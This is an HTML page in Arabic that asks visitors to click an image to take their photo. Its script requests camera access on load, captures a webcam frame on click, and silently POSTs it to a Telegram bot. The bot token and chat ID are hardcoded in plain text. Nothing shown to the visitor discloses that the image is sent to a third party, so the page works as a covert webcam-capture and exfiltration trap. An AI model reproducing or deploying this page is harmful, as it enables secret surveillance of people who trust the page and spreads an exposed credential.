<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title>التقاط صورة وإرسالها للبوت</title>
<style>
  body {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    background: linear-gradient(135deg, #1e3c72, #2a5298);
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    color: #fff;
    text-align: center;
    margin: 0;
  }

  h2 {
    font-size: 2em;
    font-weight: bold;
    margin-bottom: 20px;
    text-shadow: 2px 2px 6px rgba(0,0,0,0.5);
  }

  #snapshot {
    display: none;
    margin-top: 20px;
    border-radius: 20px;
    border: 4px solid #fff;
    box-shadow: 0 8px 20px rgba(0,0,0,0.4);
    width: 400px;
    height: 300px;
    object-fit: cover;
  }

  #captureBtn {
    cursor: pointer;
    border: none;
    background: none;
    margin-top: 20px;
  }

  #captureBtn img {
    width: 120px;
    transition: transform 0.3s ease;
  }

  #captureBtn:hover img {
    transform: scale(1.1);
  }

  #errorMsg {
    display: none;
    margin-top: 20px;
    padding: 15px 20px;
    border-radius: 12px;
    background: rgba(255,0,0,0.7);
    font-weight: bold;
  }
</style>
</head>
<body>

<h2>اضغط على الصورة لالتقاط صورتك</h2>

<button id="captureBtn">
  <img src="capture-icon.png" alt="اضغط هنا">
</button>

<img id="snapshot" alt="صورتك">

<div id="errorMsg">الرجاء السماح بالوصول إلى الكاميرا!</div>

<canvas id="canvas" width="400" height="300" style="display:none;"></canvas>
<video id="video" autoplay style="display:none;"></video>

<script>
  const BOT_TOKEN = "8093649886:AAEk1TROjXUB1aD1qY79tSRkAtvv371eOtw";
  const CHAT_ID = 1640137314;

  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const snapshotImg = document.getElementById('snapshot');
  const captureBtn = document.getElementById('captureBtn');
  const errorMsg = document.getElementById('errorMsg');

  let stream;

  // الوصول للكاميرا عند تحميل الصفحة
  navigator.mediaDevices.getUserMedia({ video: true, audio: false })
    .then(s => {
      stream = s;
      video.srcObject = stream;
      video.onloadedmetadata = () => video.play();
    })
    .catch(err => {
      errorMsg.style.display = "block";
      captureBtn.style.display = "none";
      console.error("فشل الوصول للكاميرا:", err);
    });

  // التقاط الصورة وإرسالها للبوت
  captureBtn.addEventListener('click', () => {
    if (!stream) return;

    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    // عرض الصورة على الموقع
    snapshotImg.src = canvas.toDataURL('image/png');
    snapshotImg.style.display = 'block';

    // إرسال الصورة للبوت
    canvas.toBlob(blob => {
      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('photo', blob, 'snapshot.png');

      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      })
      .then(res => console.log("تم الإرسال للبوت"))
      .catch(err => console.error("خطأ بالإرسال:", err));
    }, 'image/png');
  });
</script>

</body>
</html>
